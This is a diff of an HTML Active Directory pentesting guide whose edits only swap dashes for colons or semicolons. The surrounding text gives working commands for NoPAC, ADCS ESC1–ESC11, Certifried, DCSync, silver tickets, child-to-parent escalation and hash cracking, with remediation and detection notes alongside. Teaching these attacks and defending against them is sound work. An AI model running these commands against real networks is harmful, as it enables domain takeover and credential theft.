+<p>The <strong>NoPAC attack</strong> exploits two vulnerabilities, <strong>CVE-2021-42278</strong> and <strong>CVE-2021-42287</strong>, to enable a domain user to impersonate any privileged account, including domain controllers.</p>
 
 <h4 id="nopac-mechanism">9.4.1 Attack Mechanism</h4>
 
@@ -10242,9 +10242,9 @@ ls \\target\c$</code></pre></li>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Create or take over a computer/user account</label></li>
 <li><label><input type="checkbox"> Change its <code>sAMAccountName</code> to match a DC (e.g., <code>DC03</code> without <code>$</code>)</label></li>
-<li><label><input type="checkbox"> Request a TGT using the modified <code>sAMAccountName</code> -- the TGT is issued for <code>DC03</code></label></li>
+<li><label><input type="checkbox"> Request a TGT using the modified <code>sAMAccountName</code>: the TGT is issued for <code>DC03</code></label></li>
 <li><label><input type="checkbox"> Revert the <code>sAMAccountName</code> to the original value</label></li>
-<li><label><input type="checkbox"> Request a Service Ticket using S4U2self -- the KDC cannot find account <code>DC03</code>, appends <code>$</code>, matches the real DC <code>DC03$</code>, and issues a ticket with DC privileges</label></li>
+<li><label><input type="checkbox"> Request a Service Ticket using S4U2self; the KDC cannot find account <code>DC03</code>, appends <code>$</code>, matches the real DC <code>DC03$</code>, and issues a ticket with DC privileges</label></li>
 </ul>
 
 
@@ -10259,7 +10259,7 @@ ls \\target\c$</code></pre></li>
 <li><strong>Logon Information</strong>: Session details (logon time, etc.)</li>
 </ul>
 
-<p>The NoPAC name reflects that a vulnerable DC returns a TGT <em>without a PAC</em>, which is the scan indicator -- PAC-less TGTs are significantly smaller (typically under 1000 bytes vs. 1500+ with PAC).</p>
+<p>The NoPAC name reflects that a vulnerable DC returns a TGT <em>without a PAC</em>, which is the scan indicator; PAC-less TGTs are significantly smaller (typically under 1000 bytes vs. 1500+ with PAC).</p>
 
 <h4 id="nopac-enum-windows">9.4.3 Enumeration from Windows</h4>
 
@@ -10415,7 +10415,7 @@ KRB5CCNAME=Administrator@cifs_dc03.[domain]@[domain].ccache psexec.py [foreign-d
 
 <h4 id="gpo-links">9.5.3 GPO Links and Processing Order</h4>
 
-<p>A GPO exists in isolation until linked to a Site, Domain, or OU. GPOs are processed in a specific order -- policies applied later take precedence when conflicts exist:</p>
+<p>A GPO exists in isolation until linked to a Site, Domain, or OU. GPOs are processed in a specific order; policies applied later take precedence when conflicts exist:</p>
 
 <table class="custom-table">
 <thead><tr><th>Order</th><th>Level</th><th>Precedence</th></tr></thead>
@@ -10446,7 +10446,7 @@ KRB5CCNAME=Administrator@cifs_dc03.[domain]@[domain].ccache psexec.py [foreign-d
 
 <ol>
 <li><strong>Modify a GPO</strong>: If we compromise an account with delegated edit rights on a GPO, we can alter it to execute commands on all computers in the GPO's scope</li>
-<li><strong>Link a GPO</strong>: Rights to link a GPO to a Site, Domain, or OU (alone insufficient -- also need ability to modify or create a GPO)</li>
+<li><strong>Link a GPO</strong>: Rights to link a GPO to a Site, Domain, or OU (alone insufficient; also need ability to modify or create a GPO)</li>
 <li><strong>Create a GPO</strong>: Combined with linking rights, allows creating and deploying arbitrary policies</li>
 </ol>
 
@@ -10642,7 +10642,7 @@ dir \\web01\c$</code></pre>
 <table class="custom-table">
 <thead><tr><th>Event ID</th><th>What to Monitor</th><th>Indicator</th></tr></thead>
 <tbody>
-<tr><td>4768</td><td>TGT requests (Kerberos authentication)</td><td><code>CertIssuerName</code> field is non-empty -- indicates PKINIT. Suspicious in environments not using WHfB or smart cards</td></tr>
+<tr><td>4768</td><td>TGT requests (Kerberos authentication)</td><td><code>CertIssuerName</code> field is non-empty; indicates PKINIT. Suspicious in environments not using WHfB or smart cards</td></tr>
 <tr><td>5136</td><td>Directory object modifications</td><td>Changes to <code>msDS-KeyCredentialLink</code> attribute by non-standard accounts (not Azure AD Connect sync or ADFS service accounts)</td></tr>
 </tbody>
 </table>
@@ -10756,9 +10756,9 @@ foreach ($event in $events) {
 <table class="custom-table">
 <thead><tr><th>Event ID</th><th>Action</th><th>Significance</th></tr></thead>
 <tbody>
-<tr><td>5137</td><td>Object created</td><td>New GPO creation -- verify if authorized</td></tr>
-<tr><td>5136</td><td>Object modified</td><td>GPO setting changes -- check for unauthorized alterations</td></tr>
-<tr><td>5141</td><td>Object deleted</td><td>GPO deletion -- potential security control removal</td></tr>
+<tr><td>5137</td><td>Object created</td><td>New GPO creation; verify if authorized</td></tr>
+<tr><td>5136</td><td>Object modified</td><td>GPO setting changes; check for unauthorized alterations</td></tr>
+<tr><td>5141</td><td>Object deleted</td><td>GPO deletion; potential security control removal</td></tr>
 </tbody>
 </table>
 
@@ -12068,9 +12068,9 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 
 <p>Core PKI benefits:</p>
 <ul>
-<li><strong>Confidentiality</strong> -- encrypt data at rest and in transit.</li>
-<li><strong>Integrity</strong> -- digital signatures detect tampering.</li>
-<li><strong>Authenticity / Non-repudiation</strong> -- message digests signed with a sender's private key prove origin.</li>
+<li><strong>Confidentiality</strong>: encrypt data at rest and in transit.</li>
+<li><strong>Integrity</strong>: digital signatures detect tampering.</li>
+<li><strong>Authenticity / Non-repudiation</strong>: message digests signed with a sender's private key prove origin.</li>
 </ul>
 
 <p>ADCS advantages over standalone PKI: tight AD DS integration, built-in CRL/OCSP revocation, custom certificate templates, scalable CA hierarchies.</p>
@@ -12120,15 +12120,15 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 </ul>
 
 
-<p><strong>Issuance Requirements</strong> -- two settings gate certificate issuance beyond basic enrollment rights:</p>
+<p><strong>Issuance Requirements</strong>: two settings gate certificate issuance beyond basic enrollment rights:</p>
 <ul>
-<li><strong>Manager Approval</strong> (<code>CT_FLAG_PEND_ALL_REQUESTS</code>, <code>0x2</code> in <code>msPKI-EnrollmentFlag</code>) -- all requests go to a "Pending" queue and require a Certificate Manager to approve.</li>
-<li><strong>Authorized Signatures / Application Policy</strong> -- number of co-signatures required on the CSR and the EKU OIDs the signing certificate must contain.</li>
+<li><strong>Manager Approval</strong> (<code>CT_FLAG_PEND_ALL_REQUESTS</code>, <code>0x2</code> in <code>msPKI-EnrollmentFlag</code>); all requests go to a "Pending" queue and require a Certificate Manager to approve.</li>
+<li><strong>Authorized Signatures / Application Policy</strong>: number of co-signatures required on the CSR and the EKU OIDs the signing certificate must contain.</li>
 </ul>
 
 <h4 id="adcs-intro-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Determine if ADCS is deployed -- check for the <code>Cert Publishers</code> group and Enrollment Services container</label>
+<li><label><input type="checkbox"> Determine if ADCS is deployed; check for the <code>Cert Publishers</code> group and Enrollment Services container</label>
 <pre><code class="language-powershell">net localgroup "Cert Publishers"</code></pre></li>
 <li><label><input type="checkbox"> Identify Enterprise CAs, enabled templates, and enrollment rights</label></li>
 <li><label><input type="checkbox"> Map EKUs to authentication potential (Client Auth, Smart Card Logon, Any Purpose, SubCA)</label></li>
@@ -12143,7 +12143,7 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 
 <h4 id="enum-windows">11.2.1 Enumeration from Windows</h4>
 
-<p>Check for the <code>Cert Publishers</code> group -- ADCS servers are members:</p>
+<p>Check for the <code>Cert Publishers</code> group; ADCS servers are members:</p>
 <pre><code class="language-powershell">net localgroup "Cert Publishers"</code></pre>
 
 <p>Use <strong>Certify.exe</strong> (C# tool by SpecterOps) to enumerate all templates and vulnerable configurations:</p>
@@ -12159,7 +12159,7 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 <p>Use <strong>NetExec</strong> to detect ADCS:</p>
 <pre><code class="language-bash">netexec ldap [target-ip] -u "[user]" -p "[password]" -M adcs</code></pre>
 
-<p>Install and use <strong>Certipy</strong> (Python tool by Oliver Lyak) -- the most comprehensive ADCS enumeration and exploitation framework:</p>
+<p>Install and use <strong>Certipy</strong> (Python tool by Oliver Lyak); the most comprehensive ADCS enumeration and exploitation framework:</p>
 <pre><code class="language-bash">pip3 install certipy-ad</code></pre>
 
 <p>Enumerate all templates and CAs:</p>
@@ -12181,7 +12181,7 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 </ul>
 
 <!-- ============================================================ -->
-<h3 id="esc1">11.3 ESC1 -- Misconfigured Certificate Template (Enrollee Supplies Subject)</h3>
+<h3 id="esc1">11.3 ESC1; Misconfigured Certificate Template (Enrollee Supplies Subject)</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc1-understanding">11.3.1 Understanding ESC1</h4>
@@ -12200,7 +12200,7 @@ ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET_FQDN
 <tr><td>2</td><td>Manager Approval is disabled (<code>msPKI-EnrollmentFlag</code> does not contain <code>CT_FLAG_PEND_ALL_REQUESTS</code>)</td></tr>
 <tr><td>3</td><td>No authorized signatures required (<code>msPKI-RA-Signature = 0</code>)</td></tr>
 <tr><td>4</td><td>Template defines EKUs enabling authentication (Client Auth, Smart Card Logon, PKINIT, Any Purpose, or no EKU)</td></tr>
-<tr><td>5</td><td><code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> is set -- requesters can specify a SAN in the CSR</td></tr>
+<tr><td>5</td><td><code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> is set; requesters can specify a SAN in the CSR</td></tr>
 </tbody>
 </table>
 
@@ -12264,7 +12264,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'</code></pre
 <li>Require at least one authorized signature on the CSR.</li>
 <li>Monitor certificate enrollment events (Event ID 4886, 4887).</li>
 </ul>
-<h3 id="esc2">11.4 ESC2 -- Any Purpose EKU / No EKU</h3>
+<h3 id="esc2">11.4 ESC2; Any Purpose EKU / No EKU</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc2-understanding">11.4.1 Understanding ESC2</h4>
@@ -12297,7 +12297,7 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 <h4 id="esc2-methodology">Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Look for templates with <code>Any Purpose</code> EKU or no EKU</label></li>
-<li><label><input type="checkbox"> Check if <code>EnrolleeSuppliesSubject</code> is set -- if yes, attack like ESC1</label></li>
+<li><label><input type="checkbox"> Check if <code>EnrolleeSuppliesSubject</code> is set; if yes, attack like ESC1</label></li>
 <li><label><input type="checkbox"> Request certificate with <code>-upn Administrator</code></label>
 <pre><code class="language-bash">certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca $CA -template ESC2 -upn Administrator</code></pre></li>
 <li><label><input type="checkbox"> Authenticate and obtain TGT/hash</label>
@@ -12312,7 +12312,7 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 <li>Remove templates with no EKU (SubCA) from Enterprise CA unless absolutely necessary.</li>
 <li>Restrict enrollment rights.</li>
 </ul>
-<h3 id="esc3">11.5 ESC3 -- Enrollment Agent Template Abuse</h3>
+<h3 id="esc3">11.5 ESC3; Enrollment Agent Template Abuse</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc3-understanding">11.5.1 Understanding ESC3</h4>
@@ -12322,14 +12322,14 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 
 <h4 id="esc3-requirements">11.5.2 Abuse Requirements (Two Conditions)</h4>
 
-<p><strong>Condition 1</strong> -- Enrollment Agent template:</p>
+<p><strong>Condition 1</strong>: Enrollment Agent template:</p>
 <ul>
 <li>Low-privileged users have enrollment rights.</li>
 <li>Manager approval disabled, no authorized signatures.</li>
 <li>Template contains <strong>Certificate Request Agent</strong> EKU.</li>
 </ul>
 
-<p><strong>Condition 2</strong> -- Target template:</p>
+<p><strong>Condition 2</strong>: Target template:</p>
 <ul>
 <li>Low-privileged users have enrollment rights.</li>
 <li>Manager approval disabled.</li>
@@ -12340,13 +12340,13 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 
 <h4 id="esc3-attack">11.5.3 Attack</h4>
 
-<p>Linux (Certipy) -- Step 1: Obtain the enrollment agent certificate:</p>
+<p>Linux (Certipy); Step 1: Obtain the enrollment agent certificate:</p>
 <pre><code class="language-bash">certipy req -u '[user]@lab.local' -p '[password]' -ca '[ca-name]' -template 'ESC3'</code></pre>
 
 <p>Step 2: Request a certificate on behalf of Administrator using the built-in <code>User</code> template:</p>
 <pre><code class="language-bash">certipy req -u '[user]@lab.local' -p '[password]' -ca [ca-name] -template 'User' -on-behalf-of 'lab\administrator' -pfx [user].pfx</code></pre>
 
-<p>Windows (Certify) -- Step 1:</p>
+<p>Windows (Certify); Step 1:</p>
 <pre><code class="language-powershell">.\Certify.exe request /ca:[dc-fqdn]\[ca-name] /template:ESC3</code></pre>
 
 <p>Step 2:</p>
@@ -12372,7 +12372,7 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 <li>Configure <strong>Enrollment Agent Restrictions</strong> on the CA to limit which users/templates can be used for on-behalf-of requests.</li>
 <li>Enable Manager Approval on enrollment agent templates.</li>
 </ul>
-<h3 id="esc4">11.6 ESC4 -- Vulnerable Certificate Template Access Control</h3>
+<h3 id="esc4">11.6 ESC4; Vulnerable Certificate Template Access Control</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc4-understanding">11.6.1 Understanding ESC4</h4>
@@ -12385,8 +12385,8 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 <p>To make a template vulnerable to ESC1, the attacker modifies:</p>
 <ul>
 <li>Grant <strong>Enrollment Rights</strong> (GUID <code>0e10c968-78fb-11d2-90d4-00c04f79dc55</code>)</li>
-<li>Disable <strong>Manager Approval</strong> -- set <code>msPKI-Enrollment-Flag</code> to remove <code>CT_FLAG_PEND_ALL_REQUESTS</code></li>
-<li>Set <code>msPKI-RA-Signature = 0</code> -- disable authorized signatures</li>
+<li>Disable <strong>Manager Approval</strong>: set <code>msPKI-Enrollment-Flag</code> to remove <code>CT_FLAG_PEND_ALL_REQUESTS</code></li>
+<li>Set <code>msPKI-RA-Signature = 0</code>: disable authorized signatures</li>
 <li>Enable <code>ENROLLEE_SUPPLIES_SUBJECT</code> in <code>msPKI-Certificate-Name-Flag</code></li>
 <li>Set <code>pKIExtendedKeyUsage</code> and <code>msPKI-Certificate-Application-Policy</code> to Client Authentication (<code>1.3.6.1.5.5.7.3.2</code>)</li>
 </ul>
@@ -12444,11 +12444,11 @@ Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN
 
 <h4 id="esc4-remediation">11.6.5 Remediation</h4>
 <ul>
-<li>Audit ACLs on all certificate template objects -- remove FullControl, WriteDacl, WriteOwner, WriteProperty for non-admin principals.</li>
+<li>Audit ACLs on all certificate template objects; remove FullControl, WriteDacl, WriteOwner, WriteProperty for non-admin principals.</li>
 <li>Use BloodHound or Certipy to identify dangerous permissions on templates.</li>
 <li>Monitor template modification events.</li>
 </ul>
-<h3 id="esc5">11.7 ESC5 -- Vulnerable PKI Object Access Control</h3>
+<h3 id="esc5">11.7 ESC5; Vulnerable PKI Object Access Control</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc5-understanding">11.7.1 Understanding ESC5</h4>
@@ -12476,13 +12476,13 @@ proxychains4 -q certipy req -u [user] -p [password] -dc-ip [dc-ip] -ns [dc-ip] -
 # Authenticate
 proxychains4 -q certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip [dc-ip]</code></pre>
 
-<p>From Windows -- use the Certificate Authority console (<code>certsrv.msc</code>) to issue pending requests, then download with Certify and authenticate with Rubeus.</p>
+<p>From Windows; use the Certificate Authority console (<code>certsrv.msc</code>) to issue pending requests, then download with Certify and authenticate with Rubeus.</p>
 
 
 <h4 id="esc5-methodology">Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Identify accounts with admin rights on the ADCS server (local admin, RBCD, S4U)</label></li>
-<li><label><input type="checkbox"> Use SubCA template -- request cert with SAN, issue denied request, retrieve</label>
+<li><label><input type="checkbox"> Use SubCA template; request cert with SAN, issue denied request, retrieve</label>
 <pre><code class="language-bash">certipy req ... -ca $CA -template SubCA -upn Administrator
 certipy ca ... -ca $CA -issue-request $ID
 certipy req ... -ca $CA -retrieve $ID</code></pre></li>
@@ -12497,7 +12497,7 @@ certipy req ... -ca $CA -retrieve $ID</code></pre></li>
 <li>Audit ACLs on PKI container objects, the CA computer object, and RPC/DCOM endpoints.</li>
 <li>Separate the ADCS server from the DC to limit blast radius.</li>
 </ul>
-<h3 id="esc6">11.8 ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA</h3>
+<h3 id="esc6">11.8 ESC6; EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc6-understanding">11.8.1 Understanding ESC6</h4>
@@ -12541,15 +12541,15 @@ certipy req -u '[user]@lab.local' -p '[password]' -ca [ca-name] -template User -
 <li>Disable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA: <code>certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</code></li>
 <li>Restart the CertSvc service after changing the flag.</li>
 </ul>
-<h3 id="esc7">11.9 ESC7 -- Vulnerable CA Access Control (ManageCA / ManageCertificates)</h3>
+<h3 id="esc7">11.9 ESC7; Vulnerable CA Access Control (ManageCA / ManageCertificates)</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc7-understanding">11.9.1 Understanding ESC7</h4>
 
 <p>ESC7 exploits elevated permissions on the Certificate Authority itself. Two rights matter:</p>
 <ul>
-<li><strong>ManageCA</strong> (CA Administrator) -- can modify CA configuration, including enabling <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>, adding ManageCertificates rights to accounts, and enabling/disabling templates.</li>
-<li><strong>ManageCertificates</strong> (Certificate Manager / CA Officer) -- can approve or deny pending certificate requests.</li>
+<li><strong>ManageCA</strong> (CA Administrator); can modify CA configuration, including enabling <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>, adding ManageCertificates rights to accounts, and enabling/disabling templates.</li>
+<li><strong>ManageCertificates</strong> (Certificate Manager / CA Officer); can approve or deny pending certificate requests.</li>
 </ul>
 
 
@@ -12561,7 +12561,7 @@ certipy req -u '[user]@lab.local' -p '[password]' -ca [ca-name] -template User -
 <p>Step 2: Add ManageCertificates rights to your account:</p>
 <pre><code class="language-bash">certipy ca -u '[user]@lab.local' -p '[password]' -ca [ca-name] -add-officer [user]</code></pre>
 
-<p>Step 3: Request a certificate with SAN (will fail -- save private key):</p>
+<p>Step 3: Request a certificate with SAN (will fail; save private key):</p>
 <pre><code class="language-bash">certipy req -u '[user]@lab.local' -p '[password]' -ca [ca-name] -template SubCA -upn Administrator
 # Save private key when prompted: y</code></pre>
 
@@ -12623,7 +12623,7 @@ certipy ca -u "$USER@$DOMAIN" -p "$PASS" -ca $CA -enable-template SubCA</code></
 <li>Monitor CA ACL changes and certificate issuance events.</li>
 <li>Ensure <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> is disabled and CA service does not need restarting to apply template changes.</li>
 </ul>
-<h3 id="esc8">11.10 ESC8 -- NTLM Relay to AD CS HTTP Endpoints</h3>
+<h3 id="esc8">11.10 ESC8; NTLM Relay to AD CS HTTP Endpoints</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc8-understanding">11.10.1 Understanding ESC8</h4>
@@ -12651,12 +12651,12 @@ certipy ca -u "$USER@$DOMAIN" -p "$PASS" -ca $CA -enable-template SubCA</code></
 <p>Step 3: Certipy captures the relay and issues a certificate (<code>lab-dc.pfx</code>). Authenticate:</p>
 <pre><code class="language-bash">certipy auth -pfx lab-dc.pfx</code></pre>
 
-<p><strong>Step 4a -- DCSync</strong> (if you compromised a DC):</p>
+<p><strong>Step 4a; DCSync</strong> (if you compromised a DC):</p>
 <pre><code class="language-bash">KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local
 # Or with NT hash:
 secretsdump.py 'lab-dc$'@lab-dc.lab.local -hashes :[ntlm-hash]</code></pre>
 
-<p><strong>Step 4b -- Silver Ticket</strong> (any machine):</p>
+<p><strong>Step 4b; Silver Ticket</strong> (any machine):</p>
 <pre><code class="language-bash"># Get Domain SID
 lookupsid.py 'lab-dc$'@[dc-ip] -hashes :[ntlm-hash]
 
@@ -12684,13 +12684,13 @@ KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass lab-dc.lab.local</code></p
 
 <h4 id="esc8-remediation">11.10.4 Remediation</h4>
 <ul>
-<li><strong>Disable HTTP web enrollment</strong> -- remove the Certificate Authority Web Enrollment role service if not needed.</li>
+<li><strong>Disable HTTP web enrollment</strong>: remove the Certificate Authority Web Enrollment role service if not needed.</li>
 <li>Enable <strong>HTTPS only</strong> with Extended Protection for Authentication (EPA/Channel Binding).</li>
 <li>Require <strong>signing</strong> on all NTLM-capable protocols (SMB signing, LDAP signing).</li>
 <li>Patch authentication coercion vectors (PetitPotam, PrinterBug).</li>
 <li>Restrict machine account templates to only necessary enrollees.</li>
 </ul>
-<h3 id="esc9">11.11 ESC9 -- Certificate Mapping Bypass (NoSecurityExtension)</h3>
+<h3 id="esc9">11.11 ESC9; Certificate Mapping Bypass (NoSecurityExtension)</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc9-understanding">11.11.1 Understanding ESC9</h4>
@@ -12761,21 +12761,21 @@ certipy auth -pfx $TARGET.pfx -domain $DOMAIN</code></pre></li>
 <ul>
 <li>Remove the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag from all templates.</li>
 <li>Set <code>StrongCertificateBindingEnforcement = 2</code> (Full Enforcement) on the KDC.</li>
-<li>Restrict GenericWrite permissions -- audit AD ACLs for unnecessary write access.</li>
+<li>Restrict GenericWrite permissions; audit AD ACLs for unnecessary write access.</li>
 <li>Apply April 2023+ updates which deprecate Disabled mode (<code>0</code>) for strong mapping keys.</li>
 </ul>
-<h3 id="esc10">11.12 ESC10 -- Certificate Mapping Bypass (Weak Registry Keys)</h3>
+<h3 id="esc10">11.12 ESC10; Certificate Mapping Bypass (Weak Registry Keys)</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc10-understanding">11.12.1 Understanding ESC10</h4>
 
 <p>ESC10 is similar to ESC9 but targets <strong>misconfigured registry keys</strong> rather than template flags. Two cases exist depending on which registry key is weakened.</p>
 
-<h4 id="esc10-case1">11.12.2 Case 1 -- StrongCertificateBindingEnforcement = 0</h4>
+<h4 id="esc10-case1">11.12.2 Case 1; StrongCertificateBindingEnforcement = 0</h4>
 
 <p>Requirements:</p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> <code>StrongCertificateBindingEnforcement = 0</code> (Disabled mode -- no strong mapping via Kerberos).</label></li>
+<li><label><input type="checkbox"> <code>StrongCertificateBindingEnforcement = 0</code> (Disabled mode; no strong mapping via Kerberos).</label></li>
 <li><label><input type="checkbox"> Any template with Client Authentication (e.g., built-in <code>User</code> template).</label></li>
 <li><label><input type="checkbox"> GenericWrite over a user account.</label></li>
 </ul>
@@ -12800,7 +12800,7 @@ certipy account update -u '[user]@lab.local' -p '[password]' -user user2 -upn us
 # Authenticate as Administrator
 certipy auth -pfx administrator.pfx -domain lab.local</code></pre>
 
-<h4 id="esc10-case2">11.12.3 Case 2 -- CertificateMappingMethods = 0x4</h4>
+<h4 id="esc10-case2">11.12.3 Case 2; CertificateMappingMethods = 0x4</h4>
 
 <p>Requirements:</p>
 <ul class="methodology-checklist">
@@ -12849,11 +12849,11 @@ reg.py "$DOMAIN/$ADMIN:$PASS"@$DC_IP query -keyName 'HKLM\SYSTEM\CurrentControlS
 <h4 id="esc10-remediation">11.12.4 Remediation</h4>
 <ul>
 <li>Set <code>StrongCertificateBindingEnforcement = 2</code> (Full Enforcement).</li>
-<li>Set <code>CertificateMappingMethods = 0x18</code> (default -- only S4USelf Kerberos mapping).</li>
+<li>Set <code>CertificateMappingMethods = 0x18</code> (default; only S4USelf Kerberos mapping).</li>
 <li>Apply April 2023+ updates that deprecate Disabled mode.</li>
 <li>Restrict GenericWrite permissions on user/computer objects.</li>
 </ul>
-<h3 id="esc11">11.13 ESC11 -- NTLM Relay to AD CS ICPR (RPC) Endpoints</h3>
+<h3 id="esc11">11.13 ESC11; NTLM Relay to AD CS ICPR (RPC) Endpoints</h3>
 <!-- ============================================================ -->
 
 <h4 id="esc11-understanding">11.13.1 Understanding ESC11</h4>
@@ -12926,7 +12926,7 @@ reg.py "$DOMAIN/$ADMIN:$PASS"@$DC_IP query -keyName 'HKLM\SYSTEM\CurrentControlS
 <tbody>
 <tr><td>Subject/Issuer</td><td><code>0x0001</code></td><td>Explicit mapping by subject and issuer</td></tr>
 <tr><td>Issuer</td><td><code>0x0002</code></td><td>Explicit mapping by issuer only</td></tr>
-<tr><td>SAN</td><td><code>0x0004</code></td><td>Implicit mapping using SAN (UPN/DNS) -- <strong>exploitable</strong></td></tr>
+<tr><td>SAN</td><td><code>0x0004</code></td><td>Implicit mapping using SAN (UPN/DNS): <strong>exploitable</strong></td></tr>
 <tr><td>S4USelf implicit</td><td><code>0x0008</code></td><td>Kerberos S4USelf implicit mapping</td></tr>
 <tr><td>S4USelf explicit</td><td><code>0x0010</code></td><td>Kerberos S4USelf explicit mapping</td></tr>
 </tbody>
@@ -12946,14 +12946,14 @@ reg.py "$DOMAIN/$ADMIN:$PASS"@$DC_IP query -keyName 'HKLM\SYSTEM\CurrentControlS
 <li>Create a new machine account (default: any user can create up to 10).</li>
 <li>Clear the machine's SPNs to avoid constraint violations.</li>
 <li>Set the <code>dNSHostName</code> to match the target (e.g., DC hostname).</li>
-<li>Request a certificate using the <code>Machine</code> template -- the CA uses <code>dNSHostName</code> for mapping.</li>
+<li>Request a certificate using the <code>Machine</code> template; the CA uses <code>dNSHostName</code> for mapping.</li>
 <li>Authenticate as the target machine.</li>
 </ol>
 
 
 <h4 id="certifried-attack-manual">11.15.2 Manual Attack (Linux)</h4>
 
-<p>Step 1: Check if patched -- request a User template certificate:</p>
+<p>Step 1: Check if patched; request a User template certificate:</p>
 <pre><code class="language-bash">certipy req -u '[user]@lab.local' -p '[password]' -ca [ca-name] -dc-ip [target-ip] -template User
 # If output says "Certificate has no object SID" -- vulnerable</code></pre>
 
@@ -13295,10 +13295,10 @@ certipy auth -pfx $DC_HOSTNAME.pfx</code></pre></li>
 <p>PassTheCert (by Yannick Meheut) authenticates via LDAPS using a certificate when PKINIT is unavailable. It supports four privilege escalation paths:</p>
 
 <ol>
-<li><strong>DCSync</strong> -- grant a user Replication-Get-Changes-All rights.</li>
-<li><strong>RBCD</strong> -- modify <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> for delegation attacks.</li>
-<li><strong>Add Computer</strong> -- create a machine account for RBCD.</li>
-<li><strong>Password Reset</strong> -- change a user's password.</li>
+<li><strong>DCSync</strong>: grant a user Replication-Get-Changes-All rights.</li>
+<li><strong>RBCD</strong>: modify <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> for delegation attacks.</li>
+<li><strong>Add Computer</strong>: create a machine account for RBCD.</li>
+<li><strong>Password Reset</strong>: change a user's password.</li>
 </ol>
 
 <p>Extract keys from PFX:</p>
@@ -13425,7 +13425,7 @@ New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.[domain]
 
 <h3 id="goldengmsa">12.6 GoldenGMSA Attack (Child to Parent)</h3>
 
-<p>Group Managed Service Accounts (gMSAs) have their passwords automatically managed by AD, rotated every 30 days, and generated as 256-byte random values. The password is derived from the <strong>KDS root key</strong> combined with gMSA-specific attributes. The KDS root key is stored in <code>CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration</code> -- within the Configuration NC. A child DC's SYSTEM account can read these keys from its local Configuration NC replica.</p>
+<p>Group Managed Service Accounts (gMSAs) have their passwords automatically managed by AD, rotated every 30 days, and generated as 256-byte random values. The password is derived from the <strong>KDS root key</strong> combined with gMSA-specific attributes. The KDS root key is stored in <code>CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration</code>: within the Configuration NC. A child DC's SYSTEM account can read these keys from its local Configuration NC replica.</p>
 
 <p>Root cause: KDS root key attributes (<code>msKds-SecretAgreementParam</code>, <code>msKds-RootKeyData</code>, etc.) are replicated to all DCs via the Configuration NC. While the DACL restricts access to Enterprise Admins, Domain Admins, and SYSTEM, a child DC's SYSTEM account can read these attributes from its local replica. Combined with the gMSA's <code>msds-ManagedPasswordID</code> from the parent domain, an attacker can compute the gMSA password.</p>
 
@@ -13726,7 +13726,7 @@ proxychains psexec.py dev.[domain]/[email protected] -k -no-pass -target-ip [tar
 <!-- ============================================================ -->
 
 <h4>Remediation</h4>
-<p>The ExtraSids attack cannot be fully prevented within a forest -- if a child domain is compromised, the parent is compromised. Focus on preventing child domain compromise. Rotate the KRBTGT password periodically (twice in succession). Monitor for Golden Ticket indicators: Event ID 4769 with encryption type 0x17, tickets with abnormally long lifetimes, TGTs for non-existent users.</p>
+<p>The ExtraSids attack cannot be fully prevented within a forest; if a child domain is compromised, the parent is compromised. Focus on preventing child domain compromise. Rotate the KRBTGT password periodically (twice in succession). Monitor for Golden Ticket indicators: Event ID 4769 with encryption type 0x17, tickets with abnormally long lifetimes, TGTs for non-existent users.</p>
 
 <pre><code class="language-bash"># Fully automated child-to-parent escalation
 proxychains raiseChild.py -target-exe [target-ip] dev.[domain]/[user]
@@ -13773,9 +13773,9 @@ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt</code></pre>
 
